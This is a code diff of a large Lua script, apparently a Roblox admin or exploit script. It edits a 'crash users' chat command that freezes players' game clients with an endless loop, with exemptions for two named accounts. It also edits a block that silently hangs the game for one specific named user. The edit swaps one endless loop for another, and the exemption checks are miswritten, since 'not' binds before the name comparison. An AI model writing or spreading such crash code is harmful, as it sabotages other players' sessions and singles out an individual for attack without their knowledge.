@@ -4819,9 +4819,7 @@ end
 if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
 if not game.Players.LocalPlayer.Name == "viniciuszk70" then
 if not game.Players.LocalPlayer.Name == "takkan007" then
-for i = 1,math.huge do
-print('idiota')
-end
+repeat until nil
 end
 end
 end
@@ -4868,9 +4866,7 @@ end
 if string.sub(tk, 1, 12) == (OwnPrefix.."crash users") then
 if not LPlayer.Name == "viniciuszk70" then
 if not LPlayer.Name == "takkan007" then
-for i = 1,math.huge do
-print('idiota')
-end
+repeat until nil
 end
 end
 end
@@ -4879,8 +4875,6 @@ end
 
 if game.Players:FindFirstChild("king_pro433") then
 if LPlayer.Name == "king_pro433" then
-for i = 1,math.huge do
-print('idiota')
-end
+repeat until nil
 end
 end
